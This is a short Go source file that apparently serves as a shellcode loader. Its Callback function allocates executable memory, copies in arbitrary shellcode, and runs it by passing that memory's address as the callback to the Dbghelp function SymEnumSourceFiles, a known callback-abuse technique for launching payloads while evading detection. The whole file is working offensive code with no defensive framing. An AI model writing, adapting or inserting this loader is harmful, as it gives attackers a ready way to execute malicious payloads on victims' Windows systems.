package TT

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	dummy [256]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
	TRUE                   = 1
	SSRVOPT_DWORDPTR       = 0x00000004
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	Dbghelp            = syscall.MustLoadDLL("Dbghelp.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	GetCurrentProcess  = kernel32.MustFindProc("GetCurrentProcess")
	SymInitialize      = Dbghelp.MustFindProc("SymInitialize")
	SymEnumSourceFiles = Dbghelp.MustFindProc("SymEnumSourceFiles")
	RtlMoveMemory      = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	hProcess, _, _ := GetCurrentProcess.Call()
	SymInitialize.Call(hProcess, NULL, TRUE)
	_, err1, err2 := SymEnumSourceFiles.Call(hProcess, NULL, NULL, addr, NULL)
	fmt.Println(err1, err2)
}
